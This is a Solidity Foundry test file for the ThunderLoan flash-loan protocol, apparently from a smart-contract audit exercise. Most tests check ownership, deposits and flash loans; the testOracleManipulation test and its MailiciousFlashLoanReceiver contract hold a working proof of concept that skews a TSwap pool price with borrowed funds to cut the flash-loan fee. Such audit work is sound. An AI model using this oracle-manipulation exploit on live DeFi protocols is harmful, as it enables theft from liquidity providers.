// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {BaseTest, ThunderLoan} from "./BaseTest.t.sol";
import {AssetToken} from "../../src/protocol/AssetToken.sol";
import {MockFlashLoanReceiver} from "../mocks/MockFlashLoanReceiver.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {BuffMockPoolFactory} from "../mocks/BuffMockPoolFactory.sol";
import {BuffMockTSwap} from "../mocks/BuffMockTSwap.sol";
import {IFlashLoanReceiver} from "../../src/interfaces/IFlashLoanReceiver.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(
            address(thunderLoan.getAssetFromToken(tokenA)),
            address(assetToken)
        );
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(
            abi.encodeWithSelector(
                ThunderLoan.ThunderLoan__NotAllowedToken.selector,
                address(tokenA)
            )
        );
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(
            tokenA,
            amountToBorrow
        );
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(
            address(mockFlashLoanReceiver),
            tokenA,
            amountToBorrow,
            ""
        );
        vm.stopPrank();

        assertEq(
            mockFlashLoanReceiver.getBalanceDuring(),
            amountToBorrow + AMOUNT
        );
        assertEq(
            mockFlashLoanReceiver.getBalanceAfter(),
            AMOUNT - calculatedFee
        );
    }

    function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(
            tokenA,
            amountToBorrow
        );

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(
            address(mockFlashLoanReceiver),
            tokenA,
            amountToBorrow,
            ""
        );
        vm.stopPrank();

        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, type(uint256).max);
        vm.stopPrank();
    }

    function testOracleManipulation() public {
        // Setup Contracts
        // This is for implementation contract
        thunderLoan = new ThunderLoan();
        // this is for Proxy Contract
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        // This is Pool Factory of TSwap in which Weth will be the asset token
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        // Then here we are creating a signle pool from PoolFacotry where tokenA will be paired with wEth
        address tswapPool = pf.createPool(address(tokenA));
        // Then we are saying that actual thunderLoan contract that we need to trigger is proxy for every thunderLoan call testContract -Static Call -> Proxy -Delegate Call -> thunderLoan(Implementaion)
        thunderLoan = ThunderLoan(address(proxy));

        // Intializing thunder loan with pf so that pf will act as an oracle for thunderLoan
        thunderLoan.initialize(address(pf));

        // Fund Tswap and set Pool
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);
        BuffMockTSwap(tswapPool).deposit(
            100e18,
            100e18,
            100e18,
            block.timestamp
        );
        vm.stopPrank();

        // Fund ThunderLoan so that it can provide flash laon
        address owner = thunderLoan.owner();
        vm.prank(owner);
        thunderLoan.setAllowedToken(tokenA, true);
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        // Now we will take a flashloan but we will manipulate prize of tswap pool so that i can change the ratio of tokenA to weth
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("Normal Fee is", normalFeeCost);
        // .296147410319118389

        uint256 amountToBorrow = 50e18;
        MailiciousFlashLoanReceiver flr = new MailiciousFlashLoanReceiver(
            address(tswapPool),
            address(thunderLoan),
            address(thunderLoan.getAssetFromToken(tokenA))
        );
        
        vm.startPrank(user);
        tokenA.mint(address(flr),100e18);
        thunderLoan.flashloan(address(flr),tokenA,amountToBorrow,"");
        vm.stopPrank();

        uint256 attackFee = flr.feeOne() + flr.feeTwo();
        console.log("Attack Fee is", attackFee);
        assert(attackFee<normalFeeCost);
    }
}

contract MailiciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(
        address _tswapPool,
        address _thunderLoan,
        address _repayAddress
    ) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        if (!attacked) {
            feeOne = fee;
            attacked = true;
            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(
                50e18,
                100e18,
                100e18
            );
            IERC20(token).approve(address(tswapPool), 50e18);
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(
                50e18,
                wethBought,
                block.timestamp
            );
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            IERC20(token).approve(address(thunderLoan), amount + fee);
            IERC20(token).transfer(repayAddress, amount + fee);
        } else {
            feeTwo = fee;
            IERC20(token).approve(address(thunderLoan), amount + fee);
            IERC20(token).approve(address(thunderLoan), amount + fee);
            IERC20(token).transfer(repayAddress, amount + fee);
        }
        return true;
    }
}
